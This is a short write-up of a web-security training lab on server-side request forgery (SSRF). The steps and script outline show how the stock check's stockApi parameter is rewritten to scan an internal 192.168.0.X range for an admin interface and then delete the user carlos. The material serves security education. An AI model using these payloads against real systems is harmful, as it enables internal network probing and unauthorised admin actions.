### Lab: Basic SSRF against another back-end system

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, use the stock check functionality to scan the internal 192.168.0.X range for an admin interface on port 8080, then use it to delete the user carlos.

_____

Analysis and Exploit:

1. Intercept the stock check request and send to **[BURP-REPEATER]**
    - POST **/product/stock**
    - stockApi : http://192.168.0.1:8080/product/stock/check?productId=1&storeId=1
2. Change the _stockApi_ value and use **[BURP-INTRUDER]** to find the admin interface (IP in the range 192.168.0.0/24)
    - stockApi : http://192.168.0.X:8080/admin
3. Once found the IP address (response with code 200), reshape stockApi param and delete the user carlos
    - stockApi: http://192.168.0.X:8080/admin/delete?username=carlos


_____

Script:

1. Scan the local subnet and stop when receive code 200 | POST **/product/stock** | params: stockApi
    - stockApi: http://192.168.0.X:8080/admin
    - for loop from 2 to 255
        - break when response.status code == 200
2. Delete user carlos | POST **/product/stock** | params: stockApi
    - stockApi: http://192.168.0.X:8080/admin/delete?username=carlos
    - if response.status code != 302, error